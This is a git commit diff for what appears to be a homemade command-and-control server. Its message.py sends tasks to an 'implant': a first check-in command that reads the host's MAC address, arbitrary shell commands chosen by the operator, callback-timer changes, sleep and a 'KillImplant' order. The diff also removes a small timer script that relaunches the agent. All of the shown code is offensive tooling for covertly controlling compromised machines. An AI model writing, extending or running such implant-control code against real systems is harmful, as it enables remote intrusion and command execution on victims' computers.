a76c7b99d4253b1ccf1ff6d27589107c98a02af2
root <root@localhost.localdomain>
2020-09-20 22:00:32 -0400

    updated timers and mesaging. Need to fix initial message command and what it outputs. Also clean up server side output to make cleaner. Start to format it to go into a DB.

--- FORCEPULL/message.py
+++ FORCEPULL/message.py
@@ -4,19 +4,26 @@ import json
 def BuildTask(data):
     raw_reply = data.decode()
     reply = json.loads(raw_reply)
-    print(reply)
     if (reply["Type"] == "init"):
-        task = '{"id": 1, "task": "uname -a"}'
+        task = '{"id": 1, "task": "cat /sys/class/net/*/address | head -n 1"}'
         replyMsg = str.encode(task)
+        print(reply)
     else:
+        if ("data" in reply):
+            print(reply["data"])
         uuid = reply["id"] + 1
         Type, cmd, value = TaskType()
         if (cmd == 0):
             json_to_load = {"id": uuid, "Type": Type, "task": "admin_tasker"}
         elif (cmd == 1):
             json_to_load = {"id": uuid, "Type": Type, "task": "admin_tasker", "value": value}
+        elif (cmd == 2):
+            json_to_load = {"id": uuid, "Type": Type, "task": "admin_sleep"}
+        elif (cmd == 3):
+            json_to_load = {"id": uuid, "Type": Type, "task": "KillImplant"}
         else:
             json_to_load = {"id": uuid, "Type": Type, "task": cmd}
+            print("Tasking Implant " + str(uuid) + " to run: " + cmd + "\n\nOutput:\n")
         json_final = json.dumps(json_to_load)
         replyMsg = str.encode(json_final)
 
@@ -25,12 +32,20 @@ def BuildTask(data):
 
 def TaskType():
     print("What do you want to do?\n")
-    for i in range(0, 2):
+    for i in range(0, 4):
         print("1. Task\n")
         print("2. Change Callback Time\n")
         print("3. View Current Callback Time\n")
+        print("4. Stop Interaction\n")
+        print("5. Kill Implant\n")
 
-        choice = int(input("Enter a number: "))
+
+        while True:
+            choice = int(input("Enter a number: "))
+            if choice not in range(1,6):
+                print("Error: Input not valid. Please enter just the number of what you wish to do")
+            else:
+                break
 
         if (choice == 1):
             Type = "task"
@@ -47,6 +62,18 @@ def TaskType():
         if (choice == 3):
             Type = "ViewTimer"
             cmd = 0
+            value = 0
+            return Type, cmd, value
+        
+        if (choice == 4):
+            Type = "SleepNow"
+            cmd = 2
+            value = 0
+            return Type, cmd, value
+        
+        if (choice == 5):
+            Type = "KillImplant"
+            cmd = 3
             value = 0
             return Type, cmd, value
 
--- FORCEPUSH/timer.py
+++
@@ -1,8 +0,0 @@
-import time
-import agent
-
-timer = 30 # 30 seconds
-while timer > 0:
-    time.sleep(0.985)
-    timer -= 1
-agent()
